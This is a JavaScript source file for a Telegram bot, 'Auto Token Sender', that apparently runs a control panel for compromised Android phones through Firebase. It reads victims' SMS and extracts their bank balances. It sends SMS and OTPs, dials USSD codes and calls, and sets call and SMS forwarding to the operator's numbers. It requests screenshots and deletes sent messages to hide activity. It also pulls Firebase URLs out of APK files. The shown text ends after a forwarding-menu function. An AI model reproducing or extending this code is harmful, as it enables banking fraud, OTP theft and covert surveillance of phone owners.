// ============================================================
// AUTO TOKEN SENDER v7.1 — Dual-mode Telegram Bot
//  MODE A (Vercel / serverless): webhook + persistent state in
//    YOUR Firebase RTDB (BOT_DB_URL). Survives redeploys.
//  MODE B (VPS / always-on): long-polling + local state file.
// Admin hub + multi-user. "No auto disconnect" — persistent.
// ============================================================
require('dotenv').config();
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const express = require('express');
const axios = require('axios');
const {
  BANK_CONFIG, BANK_NAMES, detectBanksFromText,
  parseBalanceFromText, isBankTransaction,
  extractRealNumber, extractIndianNumber, parseTokenFromMessage,
  maskFirebase, maskDeviceId, fmtAmount, fmtTimeAgo, safeMd, sleep, resolveWebhookBase
} = require('./lib');

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
// Derived from the bot token. Sent by Telegram as a header on every webhook
// call so we can reject forged requests (shown by getWebhookInfo).
const WEBHOOK_SECRET = BOT_TOKEN
  ? crypto.createHash('sha256').update(`ats:${BOT_TOKEN}`).digest('hex').slice(0, 48)
  : '';
const OWNER_ID = parseInt(process.env.ADMIN_ID || '7335168552', 10);
const BACKUP_CHANNEL = parseInt(process.env.BACKUP_CHANNEL || '-1004336937395', 10);
const POLL_TIMEOUT = process.env.POLL_TIMEOUT || 30;
const ONLINE_WINDOW_MS = (parseInt(process.env.ONLINE_WINDOW_SEC || '180', 10)) * 1000;
// Vercel mode: where bot's own state lives (persistent across redeploys)
const BOT_DB_URL = process.env.BOT_DB_URL ? String(process.env.BOT_DB_URL).replace(/\/+$/, '') : '';
const BOT_DB_PATH = process.env.BOT_DB_PATH || 'ats-state';

if (!BOT_TOKEN) {
  console.error('❌ TELEGRAM_BOT_TOKEN is required in .env');
}

const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
const STATE_FILE = process.env.STATE_FILE || path.join(__dirname, '..', 'data', 'state.json');

// ============================================================
// STATE — in-memory cache + durable store.
//  Vercel : Firebase RTDB (BOT_DB_URL) = source of truth.
//  VPS    : local data/state.json.
// ============================================================
let state = {
  owner: OWNER_ID,
  admins: [OWNER_ID],
  users: {},          // uid -> user data (isolated per user)
  _awaiting: {},      // uid -> {state,...}
  fb_owner: {},       // fbUrl -> ownerUid    (first user who connected it)
  global_devices: {}, // deviceId -> device record (never auto-removed)
  last_update_id: 0,
  bootCount: 0,
  me: null            // bot's own telegram id (anti echo)
};

let stateReady = false;
let stateLoaded = !BOT_DB_URL; // remote mode must load successfully before we ever write back
let lastLoadTs = 0;
const STATE_TTL_MS = parseInt(process.env.STATE_TTL_MS || '1500', 10);

async function initState(force = false) {
  const fresh = stateReady && (Date.now() - lastLoadTs) < STATE_TTL_MS;
  if (fresh && !force) return;
  try {
    if (BOT_DB_URL) {
      const r = await axios.get(`${BOT_DB_URL}/${BOT_DB_PATH}.json`, { timeout: 20000 });
      if (r.data && typeof r.data === 'object') {
        state = { ...state, ...r.data };
      }
      // Request succeeded (even a null/empty DB) → safe to write back later.
      stateLoaded = true;
    } else if (fs.existsSync(STATE_FILE)) {
      state = { ...state, ...JSON.parse(fs.readFileSync(STATE_FILE, 'utf8')) };
    }
    if (!state.admins || !state.admins.some(a => parseInt(a, 10) === parseInt(state.owner, 10))) {
      state.admins = [state.owner];
    }
    if (!state.owner) state.owner = OWNER_ID;
    lastLoadTs = Date.now();
  } catch (e) {
    // Do NOT mark as loaded — prevents clobbering real remote data with a
    // partial/empty in-memory state after a transient network failure.
    console.error('State load error:', e.message);
  }
  stateReady = true;
  if (BOT_TOKEN && !state.me) {
    try {
      const me = await tg('getMe');
      if (me && me.id) state.me = { id: me.id, username: me.username };
    } catch (e) {}
  }
  writeLocal();
}

let remoteSavetimer = null;
let remoteSaveChain = Promise.resolve();

function writeLocal() {
  // On Vercel the bundle filesystem is read-only; state lives in Firebase.
  if (process.env.VERCEL && !process.env.STATE_FILE) return;
  try {
    fs.mkdirSync(path.dirname(STATE_FILE), { recursive: true });
    fs.writeFileSync(STATE_FILE, JSON.stringify(state, null, 2));
  } catch (e) {
    console.error('Local state save error:', e.message);
  }
}

// Durable remote write. Serialized so concurrent callers can't interleave.
// Refuses to write until a successful remote load, so a cold-start read
// timeout can never wipe existing state.
function saveRemote() {
  if (!BOT_DB_URL || !stateLoaded) return Promise.resolve();
  remoteSaveChain = remoteSaveChain
    .catch(() => {})
    .then(() => axios.put(`${BOT_DB_URL}/${BOT_DB_PATH}.json`, state, { timeout: 20000 }))
    .catch(e => { console.error('Remote state save error:', e.message); });
  return remoteSaveChain;
}

function saveState() {
  writeLocal();
  if (BOT_DB_URL) {
    if (remoteSavetimer) clearTimeout(remoteSavetimer);
    remoteSavetimer = setTimeout(() => { saveRemote(); }, 300);
  }
}

// Await this before ending a serverless request so state actually persists.
async function flushState() {
  writeLocal();
  if (remoteSavetimer) { clearTimeout(remoteSavetimer); remoteSavetimer = null; }
  if (BOT_DB_URL) await saveRemote();
}

// ============================================================
// USER HELPERS (strict per-user isolation)
// ============================================================
const isOwner = uid => parseInt(uid, 10) === parseInt(state.owner, 10);
const isAdmin = uid => (state.admins || []).some(a => parseInt(a, 10) === parseInt(uid, 10));

function getUserData(userId) {
  const uid = String(userId);
  const existed = !!state.users[uid];
  if (!state.users[uid]) state.users[uid] = {};
  const defaults = {
    fb_urls: [],
    active_fb_url: '',
    data_path: 'clients',
    device_id: '',
    device_name: '',
    default_sim: 'sim1',
    channels: [],
    auto_forward: true,
    bank_balances: {},
    detected_banks: {},
    fwd_state: {},
    createdAt: new Date().toISOString(),
    lastSeen: new Date().toISOString()
  };
  state.users[uid] = { ...defaults, ...state.users[uid] };
  state.users[uid].lastSeen = new Date().toISOString();
  if (!existed) saveState();
  return state.users[uid];
}

function updateUserData(userId, data) {
  Object.assign(getUserData(userId), data);
  saveState();
}

const getAwaiting = userId => (state._awaiting[String(userId)] || {});
function setAwaiting(userId, key, value) {
  const uid = String(userId);
  if (!state._awaiting[uid]) state._awaiting[uid] = {};
  state._awaiting[uid][key] = value;
  saveState();
}
function clearAwaiting(userId) {
  const uid = String(userId);
  if (state._awaiting[uid]) { delete state._awaiting[uid]; saveState(); }
}

// ============================================================
// TELEGRAM API helpers
// ============================================================
async function tg(method, payload = {}, retries = 2) {
  for (let i = 0; i <= retries; i++) {
    try {
      const r = await axios.post(`${TELEGRAM_API}/${method}`, payload, { timeout: 30000 });
      return r.data?.result ?? r.data;
    } catch (e) {
      const desc = e.response?.data?.description || '';
      // No-op edits are fine — ignore quietly instead of spamming logs.
      if (/message is not modified/i.test(desc)) return null;
      // Markdown parse errors can never succeed on retry — bail immediately.
      if (/can't parse entities|parse_mode|unsupported start tag|can't find end/i.test(desc)) {
        console.error(`TG ${method} markdown error:`, desc);
        return null;
      }
      if (i === retries) {
        console.error(`TG ${method} error:`, desc || e.message);
        return null;
      }
      await sleep(800 * (i + 1));
    }
  }
}

// Send with Markdown, and if Telegram rejects the entities fall back to plain
// text so the user always gets the message.
async function sendMessage(chatId, text, buttons = null) {
  if (!BOT_TOKEN) return null;
  const markup = buttons ? { reply_markup: { inline_keyboard: buttons } } : {};
  let res = await tg('sendMessage', { chat_id: chatId, text, parse_mode: 'Markdown', ...markup });
  if (!res) res = await tg('sendMessage', { chat_id: chatId, text, ...markup });
  return res;
}

async function editMessage(chatId, messageId, text, buttons = null) {
  const markup = buttons ? { reply_markup: { inline_keyboard: buttons } } : {};
  let res = await tg('editMessageText', { chat_id: chatId, message_id: messageId, text, parse_mode: 'Markdown', ...markup });
  if (!res) res = await tg('editMessageText', { chat_id: chatId, message_id: messageId, text, ...markup });
  return res;
}

async function answerCallback(callbackId, text = '', showAlert = false) {
  await tg('answerCallbackQuery', { callback_query_id: callbackId, text, show_alert: showAlert }).catch(() => {});
}

async function sendFile(chatId, buffer, filename, caption = '') {
  try {
    const form = new FormData();
    form.append('chat_id', chatId);
    form.append('document', new Blob([buffer], { type: 'application/octet-stream' }), filename);
    if (caption) form.append('caption', caption);
    const r = await axios.post(`${TELEGRAM_API}/sendDocument`, form, { timeout: 60000 });
    return r.data?.result ?? r.data;
  } catch (e) {
    console.error('sendFile error:', e.message);
    return null;
  }
}

// ============================================================
// FIREBASE helpers
// ============================================================
async function fbGet(fbUrl, p) {
  if (!fbUrl || !p) return null;
  try {
    const r = await axios.get(`${fbUrl}/${p}.json`, { timeout: 12000 });
    return r.data;
  } catch (e) { return null; }
}
async function fbPut(fbUrl, p, data) {
  if (!fbUrl || !p) return false;
  try {
    await axios.put(`${fbUrl}/${p}.json`, data, { timeout: 12000 });
    return true;
  } catch (e) { return false; }
}
async function fbDelete(fbUrl, p) {
  if (!fbUrl || !p) return false;
  try {
    await axios.delete(`${fbUrl}/${p}.json`, { timeout: 12000 });
    return true;
  } catch (e) { return false; }
}

async function detectFirebasePath(fbUrl) {
  const paths = ['clients', 'devices', 'users', 'data', 'accounts'];
  for (const p of paths) {
    try {
      const r = await axios.get(`${fbUrl}/${p}.json?shallow=true`, { timeout: 5000 });
      if (r.data && typeof r.data === 'object' && Object.keys(r.data).length > 0) return p;
    } catch (e) {}
  }
  try {
    const r = await axios.get(`${fbUrl}/.json?shallow=true`, { timeout: 5000 });
    if (r.data && typeof r.data === 'object') {
      const keys = Object.keys(r.data);
      for (const p of paths) if (keys.includes(p)) return p;
      if (keys.length === 1) return keys[0];
    }
  } catch (e) {}
  return 'clients';
}

async function extractFirebaseFromAPK(apkBuffer) {
  const detected = new Set();
  const scan = (str) => {
    // full firebaseio URLs (any region, incl. .firebasedatabase.app)
    const full = /https:\/\/[a-zA-Z0-9\-.]+\.(?:firebaseio\.com|firebasedatabase\.app)/g;
    let m;
    while ((m = full.exec(str)) !== null) detected.add(m[0].replace(/\/+$/, ''));
    // config-style "databaseURL":"https://..." captures the full URL directly
    const quoted = /"(?:firebase_database_url|databaseURL|database_url)"\s*:\s*"([^"]+)"/g;
    while ((m = quoted.exec(str)) !== null) {
      let url = m[1].trim();
      if (url.startsWith('http') && /firebase(io\.com|database\.app)/.test(url)) detected.add(url.replace(/\/+$/, ''));
    }
  };
  scan(apkBuffer.toString('utf8', 0, Math.min(apkBuffer.length, 300000)));
  // second pass on a wider binary window if nothing found yet
  if (detected.size === 0 && apkBuffer.length > 300000) {
    scan(apkBuffer.toString('utf8', 300000, Math.min(apkBuffer.length, 900000)));
  }
  return Array.from(detected);
}

// ============================================================
// DEVICE FUNCTIONS
// ============================================================
function dataPathOf(user) { return user.data_path || 'clients'; }

async function refreshGlobalDevice(uid, fbUrl, deviceId, dev, storePhone = true) {
  if (!fbUrl || !deviceId) return null;
  const g = state.global_devices[deviceId] || { id: deviceId, fbUrl, owner_uid: String(uid), addedAt: new Date().toISOString(), banks: [], balanceByBank: {}, totalBalance: 0, phone: 'N/A', name: '', battery: '?', online: false, lastSeen: null, sims: [] };
  g.fbUrl = fbUrl;
  if (!g.owner_uid) g.owner_uid = String(uid);
  if (!g.data_path) {
    const who = state.users[g.owner_uid] || getUserData(g.owner_uid);
    g.data_path = who.data_path || 'clients';
  }
  const userForPath = state.users[g.owner_uid] || getUserData(g.owner_uid);
  g.data_path = userForPath.data_path || 'clients';

  const status = (dev && typeof dev === 'object') ? (dev.status || {}) : {};
  const rawOnline = status.online === true || dev?.online === true;
  const rawLast = status.lastSeen || status.lastUpdate || status.updatedAt || status.timestamp || dev?.lastSeen || dev?.lastUpdate || dev?.updatedAt || null;
  let lastSeen = rawLast ? new Date(rawLast).getTime() : null;
  let online = rawOnline;
  if (lastSeen && (Date.now() - lastSeen) <= ONLINE_WINDOW_MS) online = true;
  if (!lastSeen && online) lastSeen = Date.now();

  g.online = online;
  g.lastSeen = lastSeen ? new Date(lastSeen).toISOString() : g.lastSeen;
  g.battery = status.battery ?? dev?.battery ?? g.battery ?? '?';
  g.name = String(status.device_model || status.deviceModel || dev?.deviceModel || dev?.device || dev?.modelName || g.name || deviceId).substring(0, 28);
  g.sims = Array.isArray(status.sims) ? status.sims.map(s => String(s).toLowerCase().replace(/[^a-z0-9]/g, '')).filter(Boolean) : [];

  let phone = status.simNumber || status.sim1Number || status.mobNo || dev?.mobNo || dev?.phoneNumber || status.phone || g.phone || 'N/A';
  if ((!phone || phone === 'N/A') && storePhone) {
    const ud = state.users[String(uid)] || getUserData(uid);
    const msgs = await fbGet(fbUrl, `${dataPathOf(ud)}/${deviceId}/messages`);
    const num = extractRealNumber(msgs);
    if (num) phone = num;
  }
  g.phone = String(phone || 'N/A');

  // bank balances from messages (always real)
  if (storePhone) {
    try {
      const ud = state.users[String(uid)] || getUserData(uid);
      const msgs = await fbGet(fbUrl, `${dataPathOf(ud)}/${deviceId}/messages`);
      if (msgs && typeof msgs === 'object') {
        const bankSet = new Set(g.banks || []);
        const balMap = { ...(g.balanceByBank || {}) };
        for (const msg of Object.values(msgs)) {
          if (!msg || typeof msg !== 'object') continue;
          const text = String(msg.message || msg.text || msg.body || '');
          if (!text) continue;
          const banks = detectBanksFromText(text);
          const amt = parseBalanceFromText(text);
          for (const b of banks) {
            bankSet.add(b);
            if (amt !== null) {
              const stamped = balMap[b] || {};
              const ts = msg.timestamp || msg.dateTime || Date.now();
              if (!stamped.timestamp || new Date(stamped.timestamp).getTime() < new Date(ts).getTime()) {
                balMap[b] = { balance: amt, timestamp: new Date(ts).toISOString() };
              }
            }
          }
        }
        g.banks = Array.from(bankSet);
        g.balanceByBank = balMap;
        g.totalBalance = Object.values(balMap).reduce((s, b) => s + (b.balance || 0), 0);
      }
    } catch (e) {}
  }
  state.global_devices[deviceId] = g;
  return g;
}

async function scanUserDevices(uid, storePhone = true) {
  const user = getUserData(uid);
  const urls = user.fb_urls || [];
  const results = [];
  await Promise.all(urls.map(async (fbUrl) => {
    const data = await fbGet(fbUrl, dataPathOf(user));
    if (!data || typeof data !== 'object') return;
    for (const [id, dev] of Object.entries(data)) {
      if (!dev || typeof dev !== 'object') continue;
      const g = await refreshGlobalDevice(uid, fbUrl, id, dev, storePhone);
      if (g && g.online) results.push(g);
    }
  }));
  return results;
}

async function getOnlineDevices(uid) {
  // live sweep of this user's firebases (keeps status fresh)
  await scanUserDevices(uid, false);
  const out = [];
  for (const [id, g] of Object.entries(state.global_devices)) {
    if (g.owner_uid === String(uid) && g.online) out.push(g);
  }
  return out;
}

async function getDeviceInfo(uid, deviceId) {
  const user = getUserData(uid);
  for (const fbUrl of user.fb_urls || []) {
    const d = await fbGet(fbUrl, `${dataPathOf(user)}/${deviceId}`);
    if (d && typeof d === 'object') {
      return refreshGlobalDevice(uid, fbUrl, deviceId, d, true);
    }
  }
  // fallback to global (admin hub / persistent registry)
  const g = state.global_devices[deviceId];
  if (g && g.fbUrl) {
    const d = await fbGet(g.fbUrl, `${dataPathOf(user)}/${deviceId}`);
    return d ? refreshGlobalDevice(g.owner_uid, g.fbUrl, deviceId, d, true) : g;
  }
  return g || null;
}

async function deviceDir(uid, deviceId) {
  const info = await getDeviceInfo(uid, deviceId);
  if (!info || !info.fbUrl) return null;
  const user = getUserData(uid);
  const base = `${info.data_path || dataPathOf(user)}/${deviceId}`;
  return { fbUrl: info.fbUrl, base };
}

// ============================================================
// DEVICE COMMANDS (firebase webhook events)
// ============================================================
async function sendSMS(uid, deviceId, number, message, sim = null) {
  const user = getUserData(uid);
  const dir = await deviceDir(uid, deviceId);
  if (!dir) return false;
  const simSel = sim || user.default_sim || 'sim1';
  const now = new Date().toISOString();
  const ok = await fbPut(dir.fbUrl, `${dir.base}/webhookEvent/sendSms`, {
    to: number, number, message, msg: message, body: message,
    from: simSel, sim: simSel, simNo: simSel, simSlot: simSel, slot: simSel,
    isSended: true, isSent: true, isSend: true,
    timestamp: now, dateTime: now
  });
  if (ok) {
    // auto-delete after 2.5s — but NEVER delete incoming bank replies
    setTimeout(async () => {
      try {
        const msgs = await fbGet(dir.fbUrl, `${dir.base}/messages`);
        if (msgs && typeof msgs === 'object') {
          const bodyTrim = String(message || '').replace(/\s+/g, '').toLowerCase();
          const numTrim = String(number).replace(/\D/g, '');
          for (const [id, msg] of Object.entries(msgs)) {
            if (!msg || typeof msg !== 'object') continue;
            const to = String(msg.to || msg.number || msg.phoneNumber || msg.phone || '').replace(/\D/g, '');
            const txt = String(msg.message || msg.text || msg.body || '').replace(/\s+/g, '').toLowerCase();
            // Protect: never delete if message contains bank balance keywords
            const isBankReply = /bal|balance|avl|amount|close|close|ledger|total|payment/.test(txt);
            // Only delete outgoing copies: match recipient number + exact body match
            const isOutgoingDup = to && to === numTrim && bodyTrim.length > 0 && txt === bodyTrim;
            if (!isBankReply && (isOutgoingDup || msg.type === 'sent' || msg.status === 'sent')) {
              await fbDelete(dir.fbUrl, `${dir.base}/messages/${id}`);
              break;
            }
          }
        }
      } catch (e) {}
    }, 2500);
  }
  return ok;
}

async function ussdDial(uid, deviceId, code, sim = null) {
  const user = getUserData(uid);
  const dir = await deviceDir(uid, deviceId);
  if (!dir) return false;
  const simSel = sim || user.default_sim || 'sim1';
  const now = new Date().toISOString();
  return fbPut(dir.fbUrl, `${dir.base}/webhookEvent/ussd`, {
    ussd: code, code, command: code,
    from: simSel, sim: simSel, simNo: simSel, simSlot: simSel, slot: simSel,
    isUssd: true, timestamp: now, dateTime: now
  });
}

async function callDial(uid, deviceId, number, sim = null) {
  const user = getUserData(uid);
  const dir = await deviceDir(uid, deviceId);
  if (!dir) return false;
  const simSel = sim || user.default_sim || 'sim1';
  const now = new Date().toISOString();
  return fbPut(dir.fbUrl, `${dir.base}/webhookEvent/call`, {
    to: number, number, phoneNumber: number,
    from: simSel, sim: simSel, simNo: simSel, simSlot: simSel, slot: simSel,
    isCall: true, dial: true, timestamp: now, dateTime: now
  });
}

async function callForward(uid, deviceId, number, enable = true, sim = null) {
  const user = getUserData(uid);
  const dir = await deviceDir(uid, deviceId);
  if (!dir) return false;
  const simSel = sim || user.default_sim || 'sim1';
  const now = new Date().toISOString();
  const ev = enable
    ? { to: number, number, from: simSel, sim: simSel, isForward: true, isDisable: false, enable: true, timestamp: now, dateTime: now }
    : { to: '', number: '', from: simSel, sim: simSel, isForward: false, isDisable: true, enable: false, timestamp: now, dateTime: now };
  const ok = await fbPut(dir.fbUrl, `${dir.base}/webhookEvent/forwardCall`, ev);
  if (ok) {
    const cur = user.fwd_state[deviceId] || {};
    cur.call = enable ? { enabled: true, to: number, setAt: now } : { enabled: false, to: '', setAt: now };
    updateUserData(uid, { fwd_state: { ...user.fwd_state, [deviceId]: cur } });
  }
  return ok;
}

async function smsForward(uid, deviceId, number, enable = true, sim = null) {
  const user = getUserData(uid);
  const dir = await deviceDir(uid, deviceId);
  if (!dir) return false;
  const simSel = sim || user.default_sim || 'sim1';
  const now = new Date().toISOString();
  const ev = enable
    ? { to: number, number, from: simSel, sim: simSel, isForward: true, isDisable: false, enable: true, timestamp: now, dateTime: now }
    : { to: '', number: '', from: simSel, sim: simSel, isForward: false, isDisable: true, enable: false, timestamp: now, dateTime: now };
  const ok = await fbPut(dir.fbUrl, `${dir.base}/webhookEvent/forwardSms`, ev);
  if (ok) {
    const cur = user.fwd_state[deviceId] || {};
    cur.sms = enable ? { enabled: true, to: number, setAt: now } : { enabled: false, to: '', setAt: now };
    updateUserData(uid, { fwd_state: { ...user.fwd_state, [deviceId]: cur } });
  }
  return ok;
}

async function requestScreenshot(uid, deviceId) {
  const dir = await deviceDir(uid, deviceId);
  if (!dir) return false;
  const now = new Date().toISOString();
  return fbPut(dir.fbUrl, `${dir.base}/webhookEvent/takeScreenshot`, {
    request: true, command: 'takeScreenshot', timestamp: now, dateTime: now
  });
}

// ============================================================
// UI HELPERS
// ============================================================
function hdr() {
  return '🤖 **AUTO TOKEN SENDER** 🏷️\n════════════════════════════════';
}

function balanceOf(user, deviceId) {
  const q = (user.bank_balances || {})[deviceId] || {};
  let total = 0;
  const rows = [];
  for (const [b, d] of Object.entries(q)) {
    const v = d && d.balance ? d.balance : 0;
    total += v;
    rows.push({ bank: b, balance: v, ts: d?.timestamp });
  }
  rows.sort((a, b) => b.balance - a.balance);
  return { total, rows };
}

function deviceStatusLine(g) {
  if (!g) return '❌ Offline';
  if (g.online) return '✅ Online';
  return `❌ Offline (${fmtTimeAgo(g.lastSeen)} ago)`;
}

// ============================================================
// SCREENS
// ============================================================
async function showWelcome(uid, chatId) {
  const lines = [
    hdr(),
    '',
    '🚀 **AUTO TOKEN SENDER**',
    '',
    '• 📱 Control your devices remotely',
    '• 📨 Auto-forward SMS & tokens from any channel',
    '• ✏️ Manual SMS sending / OTP send',
    '• 📶 Multi-device + Multi-Firebase',
    '• 🏦 All-India bank balance check (real)',
    '• 🔐 Per-user private & isolated',
    '',
    '📌 **Start:**'
  ];
  const buttons = [[{ text: '🔗 Connect to Firebase', callback_data: 'connect_firebase' }]];
  await sendMessage(chatId, lines.join('\n'), buttons);
}

async function showLoginStatus(uid, chatId, messageId = null) {
  const user = getUserData(uid);
  const urls = user.fb_urls || [];
  const lines = [hdr(), '', '✅ **Connected Firebases:**', ''];
  urls.forEach((u, i) => lines.push(`${i + 1}. 📡 \`${maskFirebase(u)}\``));
  lines.push('', '📁 Path: `' + (user.data_path || 'clients') + '/`', '');
  const buttons = [
    [{ text: '✅ Continue', callback_data: 'main_menu' }],
    [{ text: '➕ New Firebase', callback_data: 'connect_firebase' }]
  ];
  const text = lines.join('\n');
  if (messageId) await editMessage(chatId, messageId, text, buttons);
  else await sendMessage(chatId, text, buttons);
}

async function showMainMenu(uid, chatId, messageId = null, edit = false) {
  const user = getUserData(uid);
  let count = 0;
  const urls = user.fb_urls || [];
  if (urls.length > 0) {
    const online = await getOnlineDevices(uid);
    count = online.length;
  }
  const bal = balanceOf(user, user.device_id).total;
  const autoStatus = user.auto_forward !== false ? '🟢 ON' : '🔴 OFF';
  const loginUrl = urls[0] || '';
  const admin = isAdmin(uid);

  const buttons = [
    [{ text: `🟢 Online (${count})`, callback_data: 'online_devices' }, { text: '🏦 Bank Service', callback_data: 'bank_service' }],
    [{ text: '🔍 Search', callback_data: 'search_device' }, { text: '📤 Send Msg', callback_data: 'quick_send' }, { text: '⚡ Quick OTP', callback_data: 'quick_otp' }],
    [{ text: '📢 Set Channel', callback_data: 'set_channel' }, { text: '🔗 Add Firebase', callback_data: 'add_firebase' }],
    [{ text: `🔀 Auto Token: ${autoStatus}`, callback_data: 'toggle_auto' }, { text: '🔄 Refresh', callback_data: 'main_menu' }],
    ...(admin ? [[{ text: '⚙️ Admin Panel', callback_data: 'admin_menu' }]] : []),
    [{ text: '✖️ Logout', callback_data: 'logout' }]
  ];

  const lines = [
    hdr(), '',
    `📱 **Device:** \`${user.device_name || 'No Device'}\``,
    `📡 **Online:** \`${count}\``,
    `📡 **SIM:** \`${(user.default_sim || 'sim1').toUpperCase()}\``,
    `🔗 **Firebase:** \`${urls.length}\``,
    `📢 **Channel:** \`${user.channels.map(c => c).join(', ') || 'Not set'}\``,
    `🔀 **Auto Token:** \`${autoStatus}\``,
    `💰 ${fmtAmount(bal)}`,
  ];
  if (loginUrl) lines.push(`🔑 **Login:** \`${maskFirebase(loginUrl)}\``);
  lines.push('', '📌 **Select an option:**');

  const text = lines.join('\n');
  if (edit && messageId) await editMessage(chatId, messageId, text, buttons);
  else await sendMessage(chatId, text, buttons);
}

async function showOnlineDevices(uid, chatId, messageId = null, page = 0, edit = false) {
  const devices = await getOnlineDevices(uid);
  if (devices.length === 0) {
    const text = '❌ **No Online Devices**\n\n💡 Device app on ho aur Firebase connected ho tab yahan dikhenge.\n_Abhi online device hi dikhaye jaate hain — checking karo._';
    if (edit && messageId) await editMessage(chatId, messageId, text, [[{ text: '🔙 Back', callback_data: 'main_menu' }]]);
    else await sendMessage(chatId, text, [[{ text: '🔙 Back', callback_data: 'main_menu' }]]);
    return;
  }
  const PER = 12;
  const total = devices.length;
  const pages = Math.ceil(total / PER);
  if (page >= pages) page = pages - 1;
  if (page < 0) page = 0;
  const chunk = devices.slice(page * PER, page * PER + PER);
  const lines = [`📱 **ONLINE DEVICES**`, '═══════════════════', `┣ ✅ Total: \`${total}\``, `┗ 📄 Page: \`${page + 1}/${pages}\``, ''];
  const buttons = [];
  for (const dev of chunk) {
    let bEmoji = '🟡';
    const b = parseInt(dev.battery);
    if (isNaN(b)) bEmoji = '🔋';
    else if (b >= 80) bEmoji = '🟢';
    else if (b >= 50) bEmoji = '🟡';
    else if (b >= 20) bEmoji = '🟠';
    else bEmoji = '🔴';
    const phone = dev.phone && dev.phone !== 'N/A' ? ` 📞${dev.phone}` : '';
    buttons.push([{ text: `🟢 ${dev.name} ${bEmoji}${dev.battery}%${phone}`, callback_data: `dev_${dev.id}` }]);
  }
  const nav = [];
  if (page > 0) nav.push({ text: '⬅️', callback_data: `dev_page_${page - 1}` });
  nav.push({ text: '🏠', callback_data: 'main_menu' });
  if (page < pages - 1) nav.push({ text: '▶️', callback_data: `dev_page_${page + 1}` });
  buttons.push(nav);
  const text = lines.join('\n');
  if (edit && messageId) await editMessage(chatId, messageId, text, buttons);
  else await sendMessage(chatId, text, buttons);
}

function fwdStateLine(user, deviceId, kind) {
  const fs = (user.fwd_state || {})[deviceId];
  if (!fs) return `${kind} : OFF`;
  const cur = fs[kind];
  if (cur && cur.enabled) return `${kind}: ON → ${cur.to}`;
  return `${kind}: OFF`;
}

async function showDeviceManagement(uid, chatId, messageId, deviceId, edit = true, forAdmin = false) {
  const info = await getDeviceInfo(uid, deviceId);
  if (!info) {
    if (edit && messageId) await editMessage(chatId, messageId, '❌ **Device not found.**');
    else await sendMessage(chatId, '❌ **Device not found.**');
    return;
  }
  const user = getUserData(uid);
  if (!forAdmin) updateUserData(uid, { device_id: deviceId, device_name: info.name });
  const sim = (user.default_sim || 'sim1').toUpperCase();
  let bEmoji = '🟡';
  const b = parseInt(info.battery);
  if (isNaN(b)) bEmoji = '🔋';
  else if (b >= 80) bEmoji = '🟢';
  else if (b >= 50) bEmoji = '🟡';
  else if (b >= 20) bEmoji = '🟠';
  else bEmoji = '🔴';

  // balances: prefer user bank_balances then global record
  let balData = balanceOf(user, deviceId);
  let bankList = balData.rows.map(r => r.bank);
  if (bankList.length === 0 && info.banks && info.banks.length) {
    bankList = info.banks;
    for (const bb of Object.entries(info.balanceByBank || {})) {
      const [bank, d] = bb;
      const amt = d && d.balance ? d.balance : 0;
      balData.rows.push({ bank, balance: amt, ts: d?.timestamp });
    }
    balData.total = balData.rows.reduce((s, r) => s + r.balance, 0);
    // persist into user store
    const q = user.bank_balances[deviceId] || {};
    for (const r of balData.rows) q[r.bank] = { ...q[r.bank], balance: r.balance, timestamp: r.ts };
    updateUserData(uid, { bank_balances: { ...user.bank_balances, [deviceId]: q } });
  }
  const bankDisp = balData.rows.length ? balData.rows.map(r => `${BANK_CONFIG[r.bank]?.icon || '🏦'} ${r.bank}: ${fmtAmount(r.balance)}`).join('\n') : '┃ 🏦 Banks: No data yet';

  const lines = [
    `📱 **${safeMd(info.name)}**`,
    '══════════════════════',
    '',
    `┃ 🆔 \`${maskDeviceId(info.id)}\``,
    `┃ 💰 ${fmtAmount(balData.total)}`,
    `┃ ${bEmoji} Battery: ${info.battery}%`,
    bankDisp,
    `┃ 📞 Mobile: ${info.phone}`,
    `┃ 📡 SIM: ${sim}`,
    `┃ 📤 ${fwdStateLine(user, deviceId, 'call')}`,
    `┃ 📨 ${fwdStateLine(user, deviceId, 'sms')}`,
    `┃━━━━━━━━━━━━━━━━`,
    `┗ ${deviceStatusLine(info)}`,
    '',
    '📌 **Manage Device:**'
  ];

  const buttons = [
    [{ text: '🔀 Auto Token', callback_data: `autotoken_${deviceId}` }, { text: '📨 Send Msg', callback_data: `sendmsg_${deviceId}` }],
    [{ text: '📖 Read SMS', callback_data: `readsms_${deviceId}` }, { text: '🏦 Bank SMS', callback_data: `banksms_${deviceId}` }],
    [{ text: '📱 USSD', callback_data: `ussd_${deviceId}` }, { text: '📞 Call Dial', callback_data: `calldial_${deviceId}` }],
    [{ text: `📡 Call Fwd`, callback_data: `callfwd_${deviceId}` }, { text: `📨 SMS Fwd`, callback_data: `smsfwd_${deviceId}` }],
    [{ text: `✅ Check Balance`, callback_data: `checkbalance_${deviceId}` }],
    [{ text: `${(user.default_sim || 'sim1') === 'sim1' ? '●' : '○'} SIM1`, callback_data: `sim_${deviceId}_sim1` }, { text: `${(user.default_sim || 'sim1') === 'sim2' ? '●' : '○'} SIM2`, callback_data: `sim_${deviceId}_sim2` }],
    [{ text: '🔄 Refresh', callback_data: `refresh_${deviceId}` }, { text: '🔙 Back', callback_data: forAdmin ? 'admin_devices' : 'online_devices' }]
  ];

  const text = lines.join('\n');
  if (edit && messageId) await editMessage(chatId, messageId, text, buttons);
  else await sendMessage(chatId, text, buttons);
}

async function showForwardMenu(uid, chatId, messageId, deviceId, kind) {
  const kindName = kind === 'call' ? '📞 Call Forwarding' : '📤 SMS Forwarding';
  const user = getUserData(uid);
  const fs = (user.fwd_state || {})[deviceId];
  const cur = fs && fs[kind];
  const stateLine = cur && cur.enabled ? `✅ **ON** → \`${cur.to}\`` : '🔴 **OFF**';
  const lines = [
    kindName, '═════════════════════', '',
    `📱 Device: \`${deviceId.substring(0, 14)}…\``,
    `Status: ${stateLine}`, '',
    'Send `set 9876543210` = enable (target number)',
    'Send `off` = disable',
    'Send `/cancel` = cancel', ''
  ];
  const buttons = [
    [{ text: `✅ Enable`, callback_data: `fwden_${deviceId}_${kind}` }, { text: `⛔ Disable`, callback_data: `fwddis_${deviceId}_${kind}` }],
    [{ text: '🔙 Back', callback_data: `dev_${deviceId}` }]
  ];
  setAwaiting(uid, 'state', `fwd_${kind}`);
  setAwaiting(uid, `fwd_${kind}_device`, deviceId);
  await editMessage(chatId, messageId, lines.join('\n'), buttons);
}

